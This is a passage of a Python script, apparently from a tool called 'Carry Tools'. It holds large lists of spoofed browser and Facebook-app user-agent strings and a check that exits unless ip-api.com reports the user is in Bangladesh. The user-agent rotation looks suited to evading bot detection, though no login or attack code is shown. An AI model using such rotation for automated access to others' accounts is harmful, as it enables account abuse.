"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
"Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSOWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
"Mozilla/5.0 (iPad; CPU OS 8_1_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B435 Safari/600.1.4",
"pMozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.4.4; sk-sk; SAMSUNG SM-G357FZ/G357FZXXU1AQJ1 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 4.4.2; pl-pl; SM-T310 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 4.2.2;pl-pl; Lenovo S5000-F/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2.2 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"WeRead/5.2.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.3.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.2.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
"WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29)",
"WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
"WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; CDY-NX9A Build/HUAWEICDY-N29)",
"WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 7.0; BTV-W09 Build/HUAWEIBEETHOVEN-W09)",
"WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.1.0 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
"WeRead/5.0.3 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
"WeRead/5.0.5 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/4.2.3 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
"WeRead/4.1.5 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
"WeRead/3.5.0 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0; DIG-AL00 Build/HUAWEIDIG-AL00)",
"WeRead/4.1.1 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
"WeRead/4.1.1 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
"Dalvik/2.1.0 (Linux; U; Android 5.1)",
"Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-P7510 Build/IMM76D)"
"Dalvik/2.1.0 (Linux; U; Android 5.1; AFTM Build/LMY47O)",
"Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=720,height=1440}",
"Dalvik/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00Q Build/KVT49L)UNTRUSTED/1.0C-1.1; Opera Mini/att/4.2",
"Dalvik/1.4.0 (Linux; U; Android 2.3.6; HUAWEI Y210-0100 Build/HuaweiY210-0100)",
"Dalvik/1.4.0 (Linux; U; Android 2.3.6; GT-S5570 Build/GINGERBREAD)",
"Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Galaxy Nexus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.3",
"Dalvik/1.6.0 (Linux; U; Android 4.2.2; Galaxy Nexus Build/JDQ39)",
"Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60",
"Dalvik/2.1.0 (Linux; U; Android 5.1; PRO 5 Build/LMY47D)",
"Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36",
"Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"]



try:
    IP = requests.get("http://ip-api.com/json/").json()["query"]
    topspeed = requests.get("http://ip-api.com/json/").json()["country"]
    if "Bangladesh" not in topspeed:
            print(f"\n\x1b[38;5;44mSorry bro Carry Tools will only work in Bangladesh\033[1;97m")
            PH = input('\n\x1b[38;5;196mYour Any Problem Help (y/n) : ')
            if PH == 'y':
               os.system('xdg-open https://m.me/LINK.BANDHUBIRE.DIBA.NAKI')
            exit()
except requests.exceptions.ConnectionError:
        print(f"\033[1;91mYour net problem please turn on data or wifi\033[1;97m")
        exit()


agent=['Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3','Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3','Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3','Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1','Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.2 (KHTML, like Gecko) Chrome/22.0.1216.0 Safari/537.2','Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.17 Safari/537.11','Mozilla/5.0 (Windows NT 6.0) yi; AppleWebKit/345667.12221 (KHTML, like Gecko) Chrome/23.0.1271.26 Safari/453667.1221','Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.26 Safari/537.11','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.6 Safari/537.11','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1284.0 Safari/537.13','Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1290.1 Safari/537.13','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1290.1 Safari/537.13','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.14 (KHTML, like Gecko) Chrome/24.0.1292.0 Safari/537.14','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.15 (KHTML, like Gecko) Chrome/24.0.1295.0 Safari/537.15','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.90 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1500.55 Safari/537.36','Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1464.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1467.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1623.0 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36','Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/109.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.56','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0 (Edition Yx 05)','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/23.1.3.949 Yowser/2.5 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0','Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.41','Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.46','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.57','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.50','Mozilla/5.0 (Windows NT 10.0; rv:110.0) Gecko/20100101 Firefox/110.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586','Mozilla/5.0 (Windows NT 10.0; Win64; x64; XBOX_ONE_ED) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393','Mozilla/5.0 (Windows NT 10.0; Win64; x64; XBOX_ONE_ED) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393','Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536','Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Vivaldi/5.7.2921.63','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Vivaldi/5.7.2921.63','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586','Mozilla/5.0 (Windows NT 10.0; Win64; x64; XBOX_ONE_ED) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393','Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536','Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254','Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.14977','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586','Mozilla/5.0 (Windows NT 10.0; Win64; x64; XBOX_ONE_ED) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393','Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586','Mozilla/5.0 (Windows NT 10.0; Win64; x64; XBOX_ONE_ED) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393','Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536','Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254','Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.14977','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36','Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586','Mozilla/5.0 (Windows NT 10.0; Win64; x64; XBOX_ONE_ED) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393','Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) 